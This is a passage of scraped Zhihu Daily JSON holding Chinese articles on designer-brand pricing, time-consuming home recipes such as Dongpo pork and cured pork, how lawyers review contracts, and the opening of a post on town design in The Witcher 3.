其他成本，要素过多</strong></strong></p>\n<p>除了产品本身的附加值，还有些<strong>无法避免的客观因素，</strong>也增加了国外设计师款的成本。</p>\n<p><strong>① 各种税费</strong></p>\n<p>现在很流行各种跨界联名，但其实这种合作的背后，也是需要缴纳<strong>高额的设计费</strong>和<strong>版权费</strong>的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa7bcbc0b5ab2554ac2a823efba1a0a8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲ Disney X Jimmy Choo / 奈良美智 Doggy Radio x Rimowa。</strong></p>\n<p>另外<strong>进口物品都需要缴纳关税，</strong>海关对物品的分类做得非常细致。而且设计师品牌的实际进口价格也远超完税价格 2 倍，所以实际的税额就会很高：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-5d853065e005b582f932e03d170999c9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>-2019 年第 63 号《中华人民共和国进境物品完税价格表》-</p>\n<p><strong>② 运输物流成本</strong></p>\n<p>除了各个航线的<strong>运输报价在不断上涨，集装箱的成本也在变高，</strong>各种装载费、倒箱费、滞留费、空箱费等等加起来，也是一笔不小的数目。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8843baa43c0b7f7f9bdac95f0a2c7496_720w.jpg?source=8673f162\" alt=\"\"></figure><p>尤其是家居类，产品体积大，加上运费售价几乎翻倍！</p>\n<p>最近我在看家具，很喜欢一个躺椅，咨询了一下航运公司，按体积算运输费用真的很贵，都快赶上躺椅本身的价格了。</p>\n<p><strong>③ 仓储场地费</strong></p>\n<p>最后就是<strong>仓储和门面</strong>的费用了。</p>\n<p>像家居这类大型产品，很多都是在线下<strong>一边展览一边售卖</strong>的，环境好一点的展厅租金就非常昂贵，而且还要担负仓储、搬运的费用。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-06638f91edad2579327bf9a96ebf1e7d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>前面刚提过的躺椅，也是海外家居设计师品牌，尽管自己海淘费用昂贵，但线下店的价格比这还要高很多，因为他们得保住绝对的利润空间。</p>\n<p>服装类的设计师品牌也是同样的道理，<strong>门店的成本</strong>也会被计入到品牌的运营成本，而且很多设计师品牌为了<strong>保持高端形象，</strong>都会把店开在一线城市的黄金区域。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b1b5fdb52820aa6dd6a349debd34e325_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲前面提到过的 DVN 和 Acne studios，在上海的门店就都在静安区芮欧百货。</strong></p>\n<p>这一连串成本最后还是要消费者来承担，无形中就增加了商品的价格。</p>\n<p>好，那大家对设计师品牌的价格值不值，<strong>可能也有自己的看法了。</strong>最后我们就一起来聊聊，日常里该怎样安排自己的消费吧！</p>\n<p><strong>====</strong><strong><strong>三、建立怎样的消费观，能更好地享受设计师品牌？</strong></strong><strong><strong>▍ 聪明的消费者，会这样去买</strong></strong></p>\n<p>虽然设计师品牌有比较高的溢价，但稍微筛选下，也能找到一些款式品质都很优秀的单品。</p>\n<p>就像每家饭馆都有拿手菜一样，每个品牌也有自己擅长的领域和代表性单品，他们会<strong>不吝啬成本和精力，</strong>维护好自己的这个门面。</p>\n<p>聪明会买的消费者就知道，<strong>这类“门面”其实是最值得下手投资的。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-fb3f3c82f883dcbea1cab86e117f3373_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲像 Diane Von Furstenberg 的裹身裙、 Selkie 的泡泡裙，都是各自最具代表性的单品。</strong></p>\n<p>如果你的预算有限，就没必要入手他们不太擅长的品类了。</p>\n<p>比如去 Jacquemus 买针织衫就不太值得，衣服非常薄透，没洗两次就会变形很严重，<strong>和快消品牌相比优势并不大。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7091832bcb18095511cc6d88fbfd96e5_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲</strong><strong>想买高品质针织，还不如去买鄂尔多斯的羊毛衫。</strong></p>\n<p><strong><strong>▍</strong><strong>消费都是和预算挂钩的</strong></strong></p>\n<p>经济条件不一样，<strong>对待贵价商品的心态肯定差别很大。</strong></p>\n<p>香奈儿这几年频繁涨价，中号的 CF 手袋已经突破 5W 块；还有爱马仕的配货方式，真是拿着钱都买不到。常人可能难以理解，但贵妇们仍然一包难求。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d70c3c2ca222d7c4345449dad11982b9_720w.gif?source=8673f162\" alt=\"\"></figure><p>其实就是因为<strong>经济能力和预算不同，</strong>贵妇眼里的一万块和我们的一百块差不多，在我们看来是奢侈品，在她们眼中可能只是生活需求（贫穷真的会限制想象力）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d3c19ba9678b54829a6d823dc04980c7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>所以不管是大众品牌还是设计师品牌，大家都是<strong>各取所需，</strong>来满足自己的日常需求罢了。对这种贵价商品，根据预算量力而行就好了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c311c0307eac9156ebe845cdccc67bb1_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong><strong>▍ 多方面考虑清楚需求</strong></strong></p>\n<p>决定买不买，最终也是要考虑我们自己的<strong>消费需求，</strong>包括了心理需求和实际需求。</p>\n<ul><li><strong>心理需求</strong></li></ul>\n<p>心理需求就是我们之前提到的，看你对这个品牌的<strong>文化、理念是不是有共鸣。</strong>能找到和自己气质契合的品牌，是件很幸福的事。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-e3fb81485148ea36386509896cd63d81_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲Ann Demeulemeester 是叛逆前卫的哥特风，走这种路线的人会非常喜欢这个品牌的理念和设计。</strong></p>\n<p>除了审美共鸣，中高端的设计师品牌也会利用<strong>限量、稀缺</strong>来影响消费者心理，让人更迫切地想得到它，得到的时候会觉得很珍贵，很受鼓舞。</p>\n<p>之前就有读者留言说：“发了年终奖，奖励了自己一个包包，鼓励自己以后更积极地对待工作和生活。”</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2a5e7617b696b4055e0a46eb8e5a0652_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这种正面的消费心理是不是还挺不错的？所以<strong>贵价消费也有积极的一面，</strong>心态可以更包容些。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6df6cfe289602e284ff2bbfeca56e0e7_720w.gif?source=8673f162\" alt=\"\"></figure><ul><li><strong>实际需求</strong></li></ul>\n<p>另一方面就是<strong>实际需求</strong>了，我作为时尚博主深有体会。</p>\n<p>因为经常要产出穿搭，我每个月都会买很多衣服。但之前新疆棉的事情曝光后，我就不买很多快时尚品牌了，都穿奢侈品又太不实际。</p>\n<p>所以我就把目光转到一些设计师品牌上，陆陆续续入手了一些，不过确实比较费钱：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b03fbff7a68bab718bd5c760edf7f397_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d08ed65e094e68aa723ee4df96bdcc16_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但毕竟我是工作有需要，大家日常里最好<strong>根据实际风格和穿搭预算来考量，</strong>没必要攀比或者跟风。</p>\n<p><strong>包包类可以选设计师款，</strong>大部分的设计师品牌还是爱惜羽毛的，不容易有山寨尴尬的问题，价格也比奢侈品友好一些。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-2602fcb90608ffd6184327d2b674a794_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>穿搭的话</strong>可以根据自己的风格，或者临时的诉求来决定要不要买。去一些重要的场合或者旅游度假，就可以入手几件设计师品牌的衣服。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1f27aab5d3cee00eaad09e3eb7a95da3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-cf1e1d56f55ad211542958ffaa78df0a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲ 上面是之前为读者选的 Alice + Olivia 吊带裙，适合娘 man 风的女生；下面是我之前去小森林旅游，选了 MinjuKim 的绿色短裤，拍照蛮出片的。</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/23052376\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738995"},{"title":"你做出过什么特别费时，但却十分好吃的美食？","date":"2021-08-08 23:06:39","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-871b6970c21cf256eb1b49f170aba3f7_l.jpg?source=8673f162\"><span>囡囡</span>\n<a href=\"https://www.zhihu.com/question/421807647/answer/1481002248\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>柴火煨的东坡肉</strong></p>\n<p>每次都是从早上忙到下午两三点才能吃上，吃这个得下决心，毕竟过程太折腾了，但出锅时那个香气浓郁色泽鲜丽又让人完全觉得这点儿忙碌不是个事儿。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa0e33ccd8a92c6e598c46f8654a04ec_720w.jpg?source=8673f162\" alt=\"\"></figure><p>早上去菜场，挑肥瘦相间的五花肉，不去皮，切方块。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a95a0b3d3e49017fe5288ad6cbd782fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>棉绳子系好。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-2906962550aca6b5cf186a28522bf8b6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>焯水，水里料酒、姜、花椒、八角都可以放一点，去腥气、去血水。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ea78de1874e84f93980936b69c8b771e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>焯水的同时准备等会儿煨肉用的焦糖水。（因为我是柴火做的，所以焯水的过程中有充分的时间给我准备锅底。如果是煤气天然气电磁炉，可以根据不同情况安排时间，最好能够保证肉在第一次加热后全程不要变凉。）</p>\n<p>冰糖一大块儿，和一小碗底水煮开。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3e8cd2d4f3519de0f3ac1bc3de712d6c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-a0b9f9ebb2f70565224f64f01abf0e9f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>煮至非常浓稠且泛焦糖色时，再倒入一小碗烫开水调出深棕色泛红的糖水。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-fd6b12ef3e6168de8ae7842b136f1f5d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>熬糖时有两点需要注意：1、糖浆要不停搅拌，不然后期容易局部受热糊底导致整锅糖浆带苦味儿。2、如果糖浆已经很稠，不管什么原因想要加水都一定要加烫开水，不然糖浆会迅速凝固。</p>\n<p>做好焦糖水，肉差不多也焯好了，捞起来盛盘用热开水冲洗去浮沫。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fcf4f09bb56859c03ef5f56fc636f301_720w.jpg?source=8673f162\" alt=\"\"></figure><p>看网友评论，感觉之前这一部分写得不够详细，补充一下：猪皮上的毛也是要去干净的，我一般是焯水后去，个人感觉相比焯水前，焯水后会更好去，这个问题上我不是很专业，如果有懂的朋友，欢迎细说或指正。</p>\n<p>还有一个细节前面忘记说了，讲究的话可以照做：买回来的五花肉如果是没有去皮的，切块焯水前可以用刀侧过来多刮几次猪皮表面，可以去掉猪皮表层不干净的腻子。一般要用到带皮五花肉做的菜，买回来我会先这样处理一下。</p>\n<p>下图是清理过后的肉块，清理过程忘记拍了，不好意思。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cc1e09f13c7d1293a48ec75e711bae90_720w.jpg?source=8673f162\" alt=\"\"></figure><p>处理干净的肉小火慢炸把油烤出来，时不时要给肉翻面，烤到泛金黄。这步用柴火尤其耗时，很考验我耐心。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2291bb566599f5d003fa1d7f08496f92_720w.jpg?source=8673f162\" alt=\"\"></figure><p>把葱、姜、红枣、山楂片切好铺进一只砂锅里，葱可以多铺一点，有助于避免肉在煮的过程中粘锅底。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-430fb2b0270d0aa6f66b43e8a432c435_720w.jpg?source=8673f162\" alt=\"\"></figure><p>炸好的肉放入砂锅中，有皮的那面朝上，倒入之前准备好的焦糖水、酱油、黄酒或者料酒。不同的酒形成的口感不同，可以根据个人口味灵活选择。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4174fb41f34eae7b5320e8f1f89796b6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>大火烧开锅后，小火慢炖，炖到汁收到一半的时候把肉翻面，有皮的那面朝下，直到把汁收到快干，出锅。一般得炖一个半小时快两个小时。期间一定要注意防止肉黏锅。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4e110ab6a85228b150cbdbfe85c24619_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-4ffa732fe67df43d512cb715fef11e25_720w.jpg?source=8673f162\" alt=\"\"></figure><p>装盘，到这一步已经很有看相了，不过这还没完呢，还得再腾盘蒸上一个多小时，免得这肉太油腻且泛干。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-12642be0f7bdb62fd69d22baf422e645_720w.jpg?source=8673f162\" alt=\"\"></figure><p>蒸完的东坡肉趁热撒上一把小葱花，可以说是完美诠释了“肥而不腻”这四个字，酸甜鲜香，不枉这一番折腾。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c97a72ff2f2b3caef8c86b37c412d8ff_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>腌笃鲜</strong></p>\n<p>每年到了有竹笋的季节，家乡这里爱吃竹笋烧咸肉，当地叫腌笃鲜，两样开春才凑齐的食材结合在一起，鲜上加鲜，不用加任何调味剂就能鲜掉眉毛。</p>\n<p>其中一位主角——咸肉，往往是家家户户自己动手腌制。整个腌制过程有半月有余，到咸肉彻底风干则更久。做法费时但并不复杂，上手容易，做好后易于储存，用来煲汤煮皆饭咸鲜可口，比鲜肉有过之无不及，我想这也是它贯穿古今，成为很多老南京及其他地区同志们年年要做的美食原因之一。</p>\n<p>这是我今年腌的咸肉。</p>\n<p><strong>要用到的食材：10 斤五花肉、1 斤粗盐、花椒、八角、白酒、一个容器和一堆重物。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cef8713413d679255369c9441f4dca8c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>腌咸肉本身不难，重要的是开始腌制的时间，一般是寒冬腊月的时候腌，这样腌制过程中才不容易坏，最晚到初春我也腌过，总之气温不能太高，空气也不能太湿。</p>\n<p>买肥瘦相间的五花肉，开成不宽不窄的长条，期间不要用水洗，怎么清理我后面会说。</p>\n<p>半斤左右粗盐加上花椒和一点点八角小火翻炒到盐微微泛黄，我个人的诀窍是加一点十三香粉炒，感觉这样做出来更香，量凭个人口味自己把握。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c4a63f8e352b8ba4c63170c2d8a35c95_720w.jpg?source=8673f162\" alt=\"\"></figure><p>生五花肉用干净纱布蘸白酒反复擦拭表面清洗，白酒消毒且能去腥，不能用水。</p>\n<p>擦好的肉表面均匀地抹上炒好的盐，整齐摆放到容器里。怕坏可以多放点盐。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f81a806d131e595fd7c59eedfef2020a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>抹好放整齐的肉，用保鲜膜盖好，上面压上重物，我当时压了一袋十斤的大米，一桶大桶的食用油，然后能累住的都往上累了一点儿，总之是重点儿好，重点儿能在腌制过程中把肉的水分压出来。</p>\n<p>压上一两天，容器里就会有约莫小半容器汁水，把水倒干，把肉翻一翻，再炒半斤粗盐，抹在肉上，压上重物，腌一两天。</p>\n<p>一两天后肉里的水分大部分都腌出来了，就能系上绳子挂在阴凉通风处风干了。大概要挂十几天的样子。</p>\n<p>风干后的咸肉可以就挂在那儿，想吃的时候切点儿，也可以用真空机抽真空保存，我一般会在初夏时开始抽真空。这样的咸肉，不冷冻也能存一年多还保持口感如初。</p>\n<p>咸肉几乎是百毒不侵，到入夏前后，会招来一种蛾子之类昆虫的幼虫，一种黑颜色的毛毛虫，听说以前没有冰箱没有真空机的时候，是靠麻油来驱逐这种虫子。也是很有意思。</p>\n<p>屋后竹林里采的嫩笋，焯水去涩味儿。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e28430142c9b98de4a2497a964c2f26b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>咸肉开片煎出香气，加热开水炖至汤发白，春笋下进咸肉汤里煮至竹笋的清香鲜甜味儿融入汤里。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-4f80b750706354e624e653c93251ac89_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这两样食材在一起合出来的味儿绝不负多月苦等，浑然天成，是盘里的江南春光，可人又明媚。：D</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3fed8a2645200966e47fa10d1620fdde_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>芝士猪肉脯</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8e162a99a4b70f4d860d5d076b001f0f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-757b97338583d19db2ed0b7956bda3dd_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>中秋节月饼</strong></p>\n<p>月饼做完需要回油三天，光冲这点就让我这个算数困难户觉得很费时费事，再加上每年中秋前夕本身就挺忙的，还得算各种材料准备的时间，算烤好月饼后的回油时间，算清楚了得提前准备材料进行制作，不然就赶上不送给自己想送的人……等等等等。</p>\n<p>可是却从来没有觉得不值，因为每个拿到我亲手做的月饼的人都会很开心；人活着不是只为了自己，更多时候，喜悦的心情，是给别人带来幸福感的同时，从大家的共情中产生的。</p>\n<p>我想这也是很多食物，乃至事物，明明很耗时耗力，很艰难险阻，但我们仍然奋勇前行，契而不舍的原因。</p>\n<p>网上有很多怎么做月饼的相关教程，我这里就不写做法了，因为我感觉我的月饼味道真的挺一般的，还经常塌掉……</p>\n<p>自己这门“小手艺”实在算不上好，也因此更感谢每年亲人朋友们收到它后表现出来的认同与喜爱，食物带来的从来不是单纯的物质享受。</p>\n<p>五仁月饼说：生而为仁，五要努力不感到抱歉～ 谢谢同志们的喜欢，祝大家中秋快乐！双节快乐！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-aedb01b89134cc8c060debb223fb267a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-9d9bdbc5ee0b19150afbe5ff7d1a0df3_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>油鸡枞</strong></p>\n<p>这个没有太大的技术含量，主要就是费时间，感觉倒是挺切题的。从采回来清洗好直到下锅，半天的时间就耗在里面了，熬制则不管是柴火还是天然气，都是三四个小时起步，好吃，但是略辛苦。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-dab5945d3f0c121f99d4d5bd0bc7c29d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>做法以前写过的，这里不再复述啦。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e61dbc140a912fd1147ce2417cdb9ca3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-48e52781f4dce95145d76ac1247d661d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-c39ac051ea7e5968bc26eb9174d35ea0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-f42a4b578c52e4a99d1ace0e946dbcc4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8a3e1a0b85cd991236c9f189495b7b9f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-47b7a530bc3f0623d68d0ddf53ccb011_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>上汤竹燕窝</strong></p>\n<p>这道菜费时之处在于很多前期准备工作，一来是汤底的熬制，二来是竹燕窝的清洗。一般一锅好的汤底，从处理食材到熬制，时间不会少于四个小时。刚采回来的竹燕窝也需要经过来来回回的仔细清洗，才能将上面的竹沫等杂物彻底清理干净。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-f748a0194c7e427485e83942ead39379_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d7d20bbb648f6450a70044d85a48bddc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-235444777559a9f3a3fa360091f36ad0_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/421807647\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738987"},{"title":"律师审合同的专业性体现在哪里？","date":"2021-08-08 23:06:29","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-d1f485885e3f4839967be5a9af2944f7_l.jpg?source=8673f162\"><span>Icaman lawyer，</span><span>法天使fatianshi.cn创始人。关注合同。</span>\n<a href=\"https://www.zhihu.com/question/63418624/answer/1458384600\" hidden>阅读原文</a>\n</div>\n<div>\n<p>专业性体现在：</p>\n<p>1）促进交易，而不是凸显存在感。</p>\n<p>不是改很多，让客户觉得律师工作有价值，律师卖了力气了。而是这样做是否有助于促进交易，或者说有助于帮助客户创造价值。当然不是说律师不能指出合同无效甚至建议停止交易。</p>\n<p>但促进交易，是律师合同工作的第一原则。在此之下，三观四步法还会提到，合同违法不等于无效，无效不等于无用，无用不等于不能签。比如，建设工程合同，在违法转包情形下可能认定无效，但工程结束已经验收的，法院仍然判决参照合同结算工程款。</p>\n<p>根本上，还是要本着促进交易的原则看合同。这个意义上，一些无关紧要的错别字，如果反复修改导致双方流程繁琐而阻碍交易，则可以选择不要修改。</p>\n<p>2）最小手术原则。</p>\n<p>好的医生，手术后给病人带来最小的创伤，不留疤最好。改个合同，修改得面目全非，看起来律师很尽责、很专业，但增加了交易成本，让对方法律人员高度审慎地详细修改我方修改过的合同，也是不妥当的做法。</p>\n<p>相反，抓住实质，在促成交易前提下，做看起来不明显的关键修改，反而更好。这是促进交易原则的应有之义。</p>\n<p>根据评论增加一个内容——</p>\n<p>3）律师审查过的合同需要“确保合法”吗？</p>\n<p>感谢陈戈先生在本回答留言评论：</p>\n<blockquote>我以为：律师审合同的专业性，一定要体现在：一是合法性。法律是律师的专业，首先要确保你所代表一方的行为合法。</blockquote>\n<p>这是个需要进一步澄清的问题。</p>\n<p>律师应该非常关注交易的合法性，但通常并不能“确保”合法，也不能把合法当做合同工作的终点。</p>\n<p>这可能挑战很多人的思维，但请大家进一步思考一下——</p>\n<p>在现实的商业世界中，有很多很多交易都是违法的，而所谓的违法，则可能是法律、行政法规，也可能是地方法规、部门规章，可能违反管理性强制规范，也可能影响效力性强制规范。</p>\n<p>我们都知道影响合同效力的，必须是法律、行政法规，且还要区分效力性强制规范和管理性强制规范。实际上，有大量的强制性规范，都是管理性强制规范。交易违反这些规范，则可能产生行政处罚等外部后果，而合同的效力并不受影响，当事人也能因此实现交易目的。</p>\n<p>这是第一层意思：违法，不一定无效。</p>\n<p>更进一层：无效，不一定无用。</p>\n<p>比如，违章建筑的房屋，租赁合同无效。此种情形下，律师审查租赁合同，如何确保合法？确保合法的唯一办法，是不要签署这个合同。</p>\n<p>但是，还要进一步注意：《城镇房屋租赁合同司法解释》第 4 条：出租人就未经批准或者未按照批准内容建设的临时建筑，与承租人订立的租赁<strong>合同无效</strong>。……第 5 条：房屋租赁合同无效，<strong>当事人请求参照合同约定的租金标准支付房屋占有使用费的，人民法院一般应予支持。</strong></p>\n<p>再举一例：《民法典》第 793 条：建设工程施工合同无效，<strong>但是建设工程经验收合格的，可以参照合同关于工程价款的约定折价补偿承包人</strong>。</p>\n<p>在前述两个例子中，合同因违法行为而产生了很严重的“无效”的后果，但是无效的后果之下，合同当事人还是实现了自己的交易目的。</p>\n<p>可见，违法不一定无效，无效不一定无用。</p>\n<p>律师的恰当做法，是指出违法性，给出无效的后果的评估。在此基础上请当事人确认是否签署，如果签署的，在此基础上进一步审查合同。若可能，还应该思考是否能调整交易结构。</p>\n<p>比如，把时间拉回到 2015 年左右滴滴刚刚推出在线打车，假如你是滴滴的律师，客户请你起草滴滴软件的用户协议，你一查法律法规，出租车业务需要相关资质，而滴滴在全国范围内搞出租车业务，没资质，违法！那你怎么办？不能确保合法，于是建议客户：这事违法，不能干，合同写不了。可当时滴滴的律师或法务怎么做的呢？经营同样业务的美国打车公司 Uber 来到中国，面对同样的法律环境，又是怎么干的呢？来看当年两家公司的条款（注意，是当年的版本）</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b73ce23207227c0548ca4a3c78cf561b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>看明白其中的要点了吧，既然干出租违法，那就强调，干的不是出租业务，而是信息平台，这么一来就“合法”了吗？要看你怎么理解了。而这正是他们的律师或法务的价值所在。看看当年的 VIE 架构的发明，也有类似的启发。</p>\n<p>合同违法、无效所产生的后果，可以从“外部”（监管机构、第三方）和“内部”（当事人之间）这两个维度去考察。下图来自图书《合同起草审查指南：三观四步法（民法典更新版）》，我们可以得出如下图形——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9a31e1a8efe4d5d0e302b61e2f38b390_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当一个合同或条款存在违法、无效风险时，我们都可以判断它是属于上图中哪个位置，从而对其风险有大致把握。</p>\n<p>存在“违法、无效”可能性的合同的起草审查，特别考验律师的功力。（某种意义上，也是律师价值所在。）</p>\n<p>律师一方面要注意：违法≠无效，无效≠无用；另一方面，既然有违法无效之处，就要考虑风险和应对。</p>\n<p>其难点在于，违法无效的可能性蕴藏在合同的各个方面（主体、标的、程序与模式），来源于各种法律规范。如何才能有步骤地全面排查，以避免遗漏？实务中，缺乏体系化梳理。此处放一张实训营课程中梳理的图表，供大家参考，这部分内容展开说要几万字，为防止跑题，这里不赘述，具体可阅读《合同起草审查指南：三观四步法（民法典更新版）》。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f0fb2567013dd9aa74f1ecb7b581ced4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>注：图表来自合同实训营三观四步法交易结构审查部分课件，版权属于法天使。</p>\n<p>小结：</p>\n<p>一句泛泛的律师要确保合同的“合法性”，是比较粗浅的看法。律师应站在促进交易的原则之下，从不同层面把握交易，处理合同。律师是在法律视角下，给当事人提供决策依据，而当事人的决策是法律、商业、行业、战略、产品、运营的多维度决策，法律只是其决策依据之一。</p>\n<p>为防止误解，还要进一步说明一下：律师必须注重执业安全。如果律师发现合同背后的交易违法、无效、甚至犯罪，律师应当建议停止交易，甚至停止法律服务。若律师没能发现这些风险，只在微观层面“审查”合同，则属于严重失职。而这也是三观四步法主张“合同审查的重点是动脑而非动笔”，主张必须“先对交易结构进行审查”的原因。</p>\n<hr>\n<p>说句题外话，律师合同起草审查，其实是件“价值感”很低的工作。</p>\n<p>合同质量差，当事人诚信履行，可能没争议；合同质量高，当事人履行不能，可能还是要诉讼（当然好的合同在诉讼中更有利）。</p>\n<p>并且，合同的好坏，往往要交易完成之后才有反馈。这导致，律师的合同工作的反馈是严重滞后且变形的。也导致律师和客户，法务和业务之间存在种种冲突。业务希望法务最好别“太啰嗦”成交最重要，客户希望律师最好“整简单点”，“反馈要快”。</p>\n<p>最后，合同的起草审查服务，作为一项专业服务缺乏标准。而标准何其重要？工业品规模化大生产的前提，是有标准。有了标准，复杂的事情，可以有品质控制。没标准，就只能看经验和职业操守，就不可控。</p>\n<p>因此，合同起草审查的三观四步法，本质上是想提供一套标准的知识和方法，让这件事有品质控制，有效率。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/63418624\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739013"},{"title":"有哪些游戏里的某个场景或者城镇设计很棒？","date":"2021-08-08 23:06:23","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-110aad5bb5754a05b709818b9387792b_l.jpg?source=8673f162\"><span>毁男孩的小图纸，</span><span>个人公众号：电影设计师</span>\n<a href=\"https://www.zhihu.com/question/30799745/answer/2040791560\" hidden>阅读原文</a>\n</div>\n<div>\n<p>看到很多回答主要在 po 游戏截图</p>\n<p>这里我想以《巫师 3：狂猎》为例，整体分析下场景或城镇设计很棒的背后原因~</p>\n<p>在 po 巫师 3 的主要场景前，我想先从《猎魔人》小说背景讲起</p>\n<p>《巫师 3：狂猎》中的世界是根据波兰作家<strong>安杰伊·萨普科夫斯基</strong>（Andrzej Sapkowski）所著的架空奇幻小说<strong>《猎魔人》</strong>系列改编的，以故事为驱动，令玩家在潜意识中进入到了猎魔人的角色。</p>\n<p>不用于其他魔幻题材的作品，巫师系列虽然充满了超自然现象和怪物，但<strong>其核心设计原则之一便是现实主义</strong>。这包括严格的地理现实世界参照，对北欧文化元素的继承和再造，对地区神话及传说故事的考据和借鉴，对真实人类生活方式和信仰的再现。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-84453d5dda5641348d295597a670679e_720w.jpg?source=8673f162\" 